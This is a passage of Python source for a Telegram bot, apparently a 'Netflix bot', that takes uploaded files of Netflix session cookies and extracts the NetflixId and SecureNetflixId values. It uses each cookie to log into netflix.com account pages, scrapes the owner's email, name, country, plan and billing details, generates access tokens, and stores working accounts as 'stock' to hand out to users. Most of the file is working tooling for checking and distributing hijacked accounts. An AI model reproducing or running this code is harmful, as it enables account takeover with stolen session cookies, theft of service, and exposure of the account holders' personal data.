        file_id = photo[-1].file_id
        
        try:
            cur = db.execute('''
                INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
                VALUES (?, ?, ?, ?)
            ''', (user_id, account_id, report_type, file_id))
            report_id = cur.lastrowid
            
            if report_type == "working":
                db.execute('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
                db.execute('UPDATE accounts SET is_working = 1, status = "available", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
            else:
                db.execute('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
                db.execute('UPDATE accounts SET is_working = 0, status = "broken", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
            
            db.execute('''
                UPDATE users 
                SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                WHERE user_id = ?
            ''', (user_id,))
            
            db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
            db.commit()
        except Exception:
            pass
        
        await safe_send_message(user_id,
            f"✅ **Report submitted!**\n\n"
            f"Report ID: #{report_id}\n"
            f"Type: {report_type.upper()}\n\n"
            f"Admin will review your report shortly.\n"
            f"You can now use the bot again.\n\n"
            f"👨‍💻 **Developer:** @Senzo268",
            context=context
        )
        
    except Exception:
        pass

# ============================================================
# CHECK JOIN
# ============================================================

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        joined = await check_force_join_safe(user_id, context)
        if joined:
            await query.edit_message_text("✅ You've joined all channels! Starting bot...")
            await start(update, context)
        else:
            await query.answer("❌ You haven't joined all channels yet!", show_alert=True)
    except Exception:
        pass

# ============================================================
# MY STATUS
# ============================================================

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        user = get_user_safe(user_id)
        account = get_assigned_account_safe(user_id)
        
        text = f"""
📊 **YOUR STATUS**

━━━━━━━━━━━━━━━━━━━━━
👤 **Name:** {safe_str(user.get('first_name'))}
🆔 **ID:** `{user_id}`
📅 **Joined:** {safe_str(user.get('joined_at'))}
━━━━━━━━━━━━━━━━━━━━━

📈 **STATISTICS**
┌─────────────────────
│ ✅ Working Reports: **{safe_int(user.get('working_reports'))}**
│ ❌ Not Working: **{safe_int(user.get('notworking_reports'))}**
│ 📦 Accounts Used: **{safe_int(user.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
└─────────────────────

🔑 **CURRENT ACCOUNT:**
"""
        if account:
            text += f"""
┌─────────────────────
│ 📧 `{safe_str(account.get('email'))}`
│ 🌍 {safe_str(account.get('country'))}
│ 📦 {safe_str(account.get('plan'))}
│ 📺 {safe_int(account.get('streams'))} streams
└─────────────────────
"""
        else:
            text += "❌ None\n"
        
        text += f"\n⏳ **Cooldown:** {WORKING_COOLDOWN_MINUTES} min"
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
        
    except Exception:
        pass

# ============================================================
# CONTACT ADMIN
# ============================================================

async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        await query.edit_message_text(
            "📝 **CONTACT ADMIN**\n\n"
            "Type your message below.\n"
            "Admin will reply to you as soon as possible.\n\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
        context.user_data["waiting_for_message"] = True
    except Exception:
        pass

# ============================================================
# BACK TO MENU
# ============================================================

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await start(update, context)
    except Exception:
        pass

# ============================================================
# ADMIN PANEL - ENHANCED
# ============================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        stats = get_total_accounts_safe()
        keyboard = [
            [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload")],
            [InlineKeyboardButton("📋 View Reports", callback_data="admin_reports")],
            [InlineKeyboardButton("📩 View Messages", callback_data="admin_messages")],
            [InlineKeyboardButton("👥 Users List", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("⚙️ Manage Channels", callback_data="admin_channels")],
            [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs")],
            [InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
        ]
        
        text = f"""
⚙️ **ADMIN PANEL**

━━━━━━━━━━━━━━━━━━━━━
🖥️ **SYSTEM STATUS**
┌─────────────────────
│ Status: **🟢 ONLINE**
│ Database: **✅ Connected**
│ Threads: **{MAX_CHECK_THREADS}**
└─────────────────────

📊 **STATISTICS**
┌─────────────────────
│ 📦 Available: **{safe_int(stats.get('total'))}**
└─────────────────────

🔽 **ADMIN ACTIONS:**
"""
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

# ============================================================
# ADMIN UPLOAD
# ============================================================

async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        await query.edit_message_text(
            "📤 **UPLOAD COOKIE FILE**\n\n"
            "Send a **.txt**, **.json**, or **.zip** file containing Netflix cookies.\n\n"
            "The bot will extract ALL cookies and check them.\n\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
        context.user_data["waiting_for_upload"] = True
    except Exception:
        pass

# ============================================================
# HANDLE FILE UPLOAD - SIMPLIFIED & SAFE
# ============================================================

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await safe_send_message(user_id, "⛔ Not authorized!", context=context)
            return
        
        if not context.user_data.get("waiting_for_upload"):
            return
        
        document = update.message.document
        if not document:
            await safe_send_message(user_id, "❌ Please send a file.", context=context)
            return
        
        file_name = document.file_name
        if not file_name.lower().endswith(('.txt', '.json', '.zip')):
            await safe_send_message(user_id, "❌ Please send .txt, .json, or .zip file.", context=context)
            return
        
        await safe_send_message(user_id, f"⏳ Processing **{file_name}**...", context=context)
        
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Extract cookies
        cookie_pairs = extract_cookie_pairs_safe(content)
        
        if not cookie_pairs:
            await safe_send_message(user_id, "❌ No Netflix cookies found in file.", context=context)
            context.user_data["waiting_for_upload"] = False
            return
        
        total_cookies = len(cookie_pairs)
        progress_msg = await safe_send_message(user_id, f"🔄 Checking **{total_cookies}** cookies...", context=context)
        
        valid = 0
        all_accounts = []
        
        for i, (nid, sid) in enumerate(cookie_pairs):
            cookies_dict = {"NetflixId": nid}
            if sid:
                cookies_dict["SecureNetflixId"] = sid
            
            result = check_account_safe(cookies_dict)
            
            if result.get("valid") and result.get("subscribed"):
                cookie_text = get_cookie_text_safe(nid, sid)
                account_data = {
                    "email": safe_str(result.get("email")),
                    "country": safe_str(result.get("country")),
                    "plan": safe_str(result.get("plan_label", "Unknown")),
                    "cookies": cookie_text,
                    "nftoken": safe_str(result.get("nftoken")),
                    "nftoken_expiry": safe_str(result.get("nftoken_expiry")),
                    "source_file": file_name,
                    "account_name": safe_str(result.get("name")),
                    "streams": safe_int(result.get("streams")),
                    "quality": safe_str(result.get("quality")),
                    "price": safe_str(result.get("price")),
                    "billing_date": safe_str(result.get("billing_date")),
                    "member_since": safe_str(result.get("member_since")),
                    "payment_method": safe_str(result.get("payment_method")),
                    "card_last4": safe_str(result.get("card_last4")),
                    "phone": safe_str(result.get("phone")),
                    "extra_member": safe_bool(result.get("extra_member")),
                    "membership_status": safe_str(result.get("membership_status")),
                    "email_verified": safe_bool(result.get("email_verified")),
                    "profiles": safe_str(result.get("profiles")),
                    "user_guid": safe_str(result.get("user_guid")),
                }
                all_accounts.append(account_data)
                valid += 1
        
        if all_accounts:
            saved = save_account_batch_safe(all_accounts)
            await safe_send_message(user_id,
                f"✅ **UPLOAD COMPLETE!**\n\n"
                f"📁 **File:** {file_name}\n"
                f"🔍 **Total:** {total_cookies}\n"
                f"✅ **Valid:** {valid}\n"
                f"💾 **Saved:** {saved}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                context=context
            )
        else:
            await safe_send_message(user_id,
                f"❌ **NO VALID ACCOUNTS FOUND!**\n\n"
                f"📁 File: {file_name}\n"
                f"🔍 Total: {total_cookies}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                context=context
            )
        
        context.user_data["waiting_for_upload"] = False
        
    except Exception:
        context.user_data["waiting_for_upload"] = False

def extract_cookie_pairs_safe(content: str) -> List[Tuple[str, Optional[str]]]:
    """Safely extract cookie pairs."""
    pairs = []
    seen = set()
    
    try:
        # Try JSON
        data = json.loads(content)
        if isinstance(data, dict):
            if "cookies" in data and isinstance(data["cookies"], list):
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        nid = safe_str(cookie.get("value"))
                        if nid and nid not in seen:
                            sid = None
                            for c in data["cookies"]:
                                if c.get("name") == "SecureNetflixId":
                                    sid = safe_str(c.get("value"))
                                    break
                            seen.add(nid)
                            pairs.append((nid, sid))
    except Exception:
        pass
    
    if not pairs:
        # Try regex
        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        netflix_matches = netflix_pattern.findall(content)
        secure_matches = secure_pattern.findall(content)
        for i, nid in enumerate(netflix_matches):
            nid = nid.strip('"\'')
            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
            if nid and nid not in seen:
                seen.add(nid)
                pairs.append((nid, sid))
    
    return pairs

def get_cookie_text_safe(netflix_id: str, secure_id: Optional[str] = None) -> str:
    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
    if secure_id:
        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
    return "\n".join(lines)

def check_account_safe(cookies_dict: Dict) -> Dict:
    """Safely check account - NEVER crashes."""
    if not cookies_dict or "NetflixId" not in cookies_dict:
        return {"valid": False, "error": "Missing NetflixId"}
    
    try:
        session = requests.Session()
        for name, value in cookies_dict.items():
            session.cookies.set(name, value, domain=".netflix.com")
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "identity",
        }
        
        for attempt in range(MAX_RETRIES):
            try:
                response = session.get(
                    "https://www.netflix.com/account/membership",
                    headers=headers,
                    timeout=CHECK_TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code != 200:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(0.5)
                        continue
                    return {"valid": False, "error": f"HTTP {response.status_code}"}
                
                if "login" in response.url.lower() or "signin" in response.url.lower():
                    return {"valid": False, "error": "Redirected to login"}
                
                text = response.text
                
                # Extract basic info
                email = None
                for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        email = match.group(1).strip()
                        break
                if not email:
                    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
                    if match:
                        email = match.group(1).strip()
                
                name = None
                for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        name = match.group(1).strip()
                        break
                
                country = None
                for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        country = match.group(1).strip()
                        break
                
                plan = None
                for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        plan = match.group(1).strip()
                        break
                
                plan_key = "FREE"
                plan_label = "Free"
                if plan:
                    plan_lower = plan.lower()
                    if any(x in plan_lower for x in ["premium", "高級", "高级"]):
                        plan_key, plan_label = "PREMIUM", "Premium"
                    elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
                        plan_key, plan_label = "STANDARD", "Standard"
                    elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
                        plan_key, plan_label = "BASIC", "Basic"
                    elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
                        plan_key, plan_label = "MOBILE", "Mobile"
                
                streams = None
                match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
                if match:
                    streams = int(match.group(1))
                
                price = None
                for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        price = match.group(1).strip()
                        break
                
                billing = None
                for pattern in [r'"nextBillingDate"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        billing = match.group(1).strip()
                        break
                
                membership_status = None
                match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match:
                    membership_status = match.group(1).strip()
                
                profiles = []
                for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
                    if match.group(1) not in profiles:
                        profiles.append(match.group(1))
                profiles_str = ", ".join(profiles) if profiles else None
                
                user_guid = None
                for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        user_guid = match.group(1).strip()
                        break
                
                is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
                
                # Generate NFToken
                nftoken = None
                nftoken_expiry = None
                if cookies_dict.get("NetflixId"):
                    nftoken, nftoken_expiry = generate_nftoken_safe(cookies_dict.get("NetflixId"))
                
                return {
                    "valid": True,
                    "subscribed": is_subscribed,
                    "email": email,
                    "name": name,
                    "country": country,
                    "plan": plan,
                    "plan_key": plan_key,
                    "plan_label": plan_label,
                    "streams": streams,
                    "quality": None,
                    "price": price,
                    "billing_date": billing,
                    "member_since": None,
                    "payment_method": None,
                    "card_last4": None,
                    "phone": None,
                    "extra_member": False,
                    "membership_status": membership_status,
                    "email_verified": False,
                    "profiles": profiles_str,
                    "user_guid": user_guid,
                    "nftoken": nftoken,
                    "nftoken_expiry": nftoken_expiry,
                }
                
            except requests.exceptions.Timeout:
                if attempt < MAX_RETRIES - 1:
                    continue
                return {"valid": False, "error": "Timeout"}
            except Exception:
                if attempt < MAX_RETRIES - 1:
                    continue
                return {"valid": False, "error": "Error"}
        
        return {"valid": False, "error": "Max retries exceeded"}
        
    except Exception:
        return {"valid": False, "error": "Error"}

# ============================================================
# SIMPLIFIED ADMIN FUNCTIONS (Placeholders - Safe)
# ============================================================

async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📋 **Reports section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📩 **Messages section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("👥 **Users section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📢 **Broadcast section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("⚙️ **Channels section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_stock_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📊 **Stock Logs section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📈 **Dashboard section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

# ============================================================
# TEXT MESSAGE HANDLER
# ============================================================

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        text = update.message.text.strip()
        
        if context.user_data.get("waiting_for_message"):
            await safe_send_message(user_id, "✅ **Message sent to admin!**\n\nYou will receive a reply here when admin responds.\n\n👨‍💻 **Developer:** @Senzo268", context=context)
            context.user_data["waiting_for_message"] = False
            return
        
        await start(update, context)
        
    except Exception:
        pass

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION")
    print("=" * 70)
    print(f"📊 Database: {'Turso' if db.use_turso else 'SQLite'}")
    print(f"👤 Admins: {ADMIN_IDS}")
    print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
    print(f"📦 Max Accounts: {MAX_ACCOUNTS_PER_USER}")
    print("=" * 70)
    
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ BOT_TOKEN not set! Please set BOT_TOKEN in .env file")
        return
    
    # Build application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(working_callback, pattern="^working$"))
    application.add_handler(CallbackQueryHandler(notworking_callback, pattern="^notworking$"))
    application.add_handler(CallbackQueryHandler(contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_menu$"))
    
    # Admin callbacks
    application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(admin_messages, pattern="^admin_messages$"))
    application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(admin_dashboard, pattern="^admin_dashboard$"))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT, handle_text_messages))
    
    try:
        print("🚀 Starting bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
